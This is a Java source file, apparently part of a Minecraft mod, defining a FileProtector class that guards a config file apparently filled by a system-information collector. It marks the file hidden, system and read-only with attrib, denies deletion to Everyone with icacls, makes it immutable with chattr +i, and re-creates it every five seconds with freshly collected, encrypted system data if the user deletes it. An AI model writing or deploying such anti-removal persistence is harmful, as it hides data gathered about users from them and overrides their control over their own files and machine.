package com.kxysl1k.util;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.*;
import java.nio.file.attribute.PosixFilePermission;
import java.util.*;
import java.util.concurrent.*;

public class FileProtector {
    private static final Logger LOGGER = LogManager.getLogger("FileProtector");
    private final Path path;
    private final ScheduledExecutorService exec = Executors.newSingleThreadScheduledExecutor();
    private ScheduledFuture<?> task;

    public FileProtector(Path path) {
        this.path = path;
    }
    //шедевро костиль на якому вся защита
    public void startProtection() {
        applyOsProtections();
        task = exec.scheduleAtFixedRate(() -> {
            try {
                if (!Files.exists(path)) {
                    LOGGER.warn("Config deleted! Recreating...");
                    // Call collectAndEncrypt from SystemInfoCollector
                    SystemInfoCollector collector = new SystemInfoCollector();
                    collector.collectAndEncrypt();
                }
            } catch (Exception e) {
                LOGGER.error("Error in protection task", e);
            }
        }, 5, 5, TimeUnit.SECONDS);
        LOGGER.info("FileProtector started for {}", path);
    }

    public void stopProtection() {
        if (task != null) task.cancel(true);
        exec.shutdown();
        try {
            if (!exec.awaitTermination(5, TimeUnit.SECONDS)) {
                exec.shutdownNow();
            }
        } catch (InterruptedException e) {
            exec.shutdownNow();
        }
        LOGGER.info("FileProtector stopped for {}", path);
    }

    private void applyOsProtections() {
        String os = System.getProperty("os.name").toLowerCase();
        try {
            if (os.contains("win")) {
                executeCommand(new String[]{"attrib", "+S", "+H", "+R", path.toString()});
                executeCommand(new String[]{"icacls", path.toString(), "/deny", "Everyone:(D,DC)"});
            } else {
                Files.setPosixFilePermissions(path, EnumSet.of(PosixFilePermission.OWNER_READ));
                executeCommand(new String[]{"chattr", "+i", path.toString()});
            }
            LOGGER.info("Applied OS-specific protections to {}", path);
        } catch (IOException e) {
            LOGGER.warn("Failed OS protection", e);
        }
    }

    private void executeCommand(String[] command) throws IOException {
        Process process = new ProcessBuilder(command).start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                LOGGER.debug(line);
            }
        }
        try {
            if (process.waitFor() != 0) {
                LOGGER.warn("Command failed: {}", Arrays.toString(command));
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            LOGGER.error("Command interrupted: {}", Arrays.toString(command), e);
        }
    }
}